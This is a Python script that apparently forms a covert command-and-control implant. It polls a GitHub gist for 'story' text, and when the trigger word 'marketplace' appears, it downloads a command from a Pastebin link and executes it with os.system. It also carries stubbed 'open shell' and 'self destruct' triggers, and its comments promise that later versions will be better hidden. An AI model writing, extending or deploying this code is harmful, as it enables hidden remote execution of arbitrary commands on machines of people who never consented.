import time
import requests
import json
import hashlib
import random
import os

favorite_character = "text"

def main():
    previous_req = ""
    while(True):
        res = getStory()
        if res.status_code == 200:    
            res_dict = json.loads(res.text)
            d = res_dict["files"][favorite_character+".txt"]["content"]
            if d != previous_req:
                previous_req = d
                parseStory(d)
            else:
                print("Same ol' Story")
        elif res.response.status == 403:
            pass
        else:
            pass
        time.sleep(random.randint(6,15))


def getStory(gistID = "613ae1b7549c7c2735000465fcd3c275"):
    GITHUB_URL = f"https://api.github.com/gists/{gistID}"
    API_KEY = "REDACTED"#TODO Will implement cleanly later
    res = requests.get(GITHUB_URL, {f"Authorization":f"token {API_KEY}"})
    return res

def parseStory(story):
    if "marketplace" in story:
        #Will be more hidden in full versions
        lines = story.split('\n')
        bin_link = lines[-1]
        cmd = requests.get(f"https://pastebin.com/raw/{bin_link}")
        if cmd.status_code == 200:
            os.system(cmd.text)
    if "beach" in story:
        #Open shell
        pass
    if "french" in story:
        #Self Destruct
        pass

if __name__ == "__main__":
    main()
